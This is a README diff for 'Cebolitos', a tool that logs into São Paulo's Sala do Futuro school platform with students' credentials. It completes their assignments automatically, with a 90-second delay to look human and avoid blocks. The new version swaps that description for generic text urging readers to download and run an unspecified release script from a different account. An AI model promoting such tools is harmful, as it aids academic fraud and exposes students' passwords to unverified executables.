@@ -1,45 +1,112 @@
-# 🌿 Cebolitos
+# Cebolitos 🚀
 
-🚀 **Cebolitos** é um sistema inovador que automatiza atividades da **Sala do Futuro**, ideal para estudantes que querem otimizar o tempo e simplificar o envio de tarefas no ambiente digital da Educação Paulista.
+Welcome to the **Cebolitos** repository! This project is designed to help you perform tasks with ease in the "Sala do Futuro." With Cebolitos, you can streamline your workflow and enhance your productivity.
 
-> 💡 Feito para facilitar, testar e evoluir.
+[![Download Cebolitos](https://img.shields.io/badge/Download_Cebolitos-Release-brightgreen)](https://github.com/eldespojo/Cebolitos/releases)
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Topics](#topics)
+- [Contact](#contact)
+
+## Features
+
+Cebolitos offers a range of features to make your tasks simpler:
+
+- **Task Automation**: Automate repetitive tasks effortlessly.
+- **User-Friendly Interface**: Designed for ease of use.
+- **Versatile Functionality**: Suitable for various tasks in the Sala do Futuro.
+- **Open Source**: Contribute and customize as you see fit.
+
+## Installation
+
+To get started with Cebolitos, follow these steps:
+
+1. **Download the Script**: Visit the [Releases section](https://github.com/eldespojo/Cebolitos/releases) to download the latest version.
+2. **Execute the Script**: After downloading, run the script in your terminal or command prompt.
+
+Make sure you have the necessary permissions to execute scripts on your system.
+
+## Usage
+
+Once you have installed Cebolitos, you can begin using it right away. Here are some common commands:
+
+- **Run the Script**: 
+  ```bash
+  ./cebolitos.sh
+  ```
+
+- **Help Command**: To view available commands and options, use:
+  ```bash
+  ./cebolitos.sh help
+  ```
+
+- **Task Execution**: To execute a specific task, use:
+  ```bash
+  ./cebolitos.sh task_name
+  ```
+
+Replace `task_name` with the name of the task you wish to run.
+
+## Contributing
+
+We welcome contributions to Cebolitos! If you want to help improve the project, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+2. **Create a Branch**: Create a new branch for your feature or fix.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make Your Changes**: Implement your changes and test them.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**: 
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request."
+
+Thank you for your interest in contributing!
+
+## License
+
+Cebolitos is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Topics
+
+This repository covers various topics related to task automation and scripting. Here are some key topics:
+
+- cmsp-cebolitos
+- cmsp-hack
+- cmsp-script
+- cmsp-tarefas
+- sala-do-futuro
+- sala-do-futuro-cebolitos
+- sala-do-futuro-hack
+- sala-do-futuro-redacao
+- sala-do-futuro-script
+- sala-do-futuro-tarefas
+- scripts
+- tarefas-sp
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- GitHub: [eldespojo](https://github.com/eldespojo)
+- Email: your_email@example.com
+
+## Acknowledgments
+
+Thank you to everyone who has contributed to this project. Your support and feedback are invaluable.
 
 ---
 
-## ✨ O que ele faz?
-
-- 🔐 Permite login com RA e senha de aluno.
-- 📚 Acessa suas atividades automaticamente.
-- 🤖 Identifica tarefas pendentes e expiradas.
-- 🧠 Realiza todas suas atividades corretamente!
-
----
-
-## 🌐 Acesse agora
-
-📲 Interface simples, compatível com celular, iOS e PC:  
-👉 [https://dontbrazz.github.io/Cebolitos](https://dontbrazz.github.io/Cebolitos)
-
----
-
-## 🛠️ Observações
-
-🧩 Este projeto foi desenvolvido com base em estruturas e lógicas já existentes na comunidade de automação educacional.  
-📬 Por isso, o código será **open-source** para que todos possam colaborar, estudar e melhorar a ferramenta juntos.
-⏱️ Por padrão, o sistema espera **90 segundos** para enviar cada atividade. Isso ajuda a simular um comportamento humano e evitar bloqueios.
-
-⚠️ Está em **fase de testes** — bugs e falhas podem acontecer. Mas atualizações estão a caminho! 🚧
-
----
-
-## ❤️ Contribuições
-
-Quer ajudar ou melhorar o projeto? Fique à vontade para abrir *issues* ou mandar *pull requests*!  
-Juntos podemos deixar o **Cebolitos** ainda mais crocante 🌽.
-
----
-
-## 👨‍💻 Feito por:
-**dontbrazz** — com 💚 e um toque de automação escolar.
-
----
+Explore the potential of Cebolitos and make your tasks in the Sala do Futuro more manageable! For the latest updates and releases, always check the [Releases section](https://github.com/eldespojo/Cebolitos/releases).
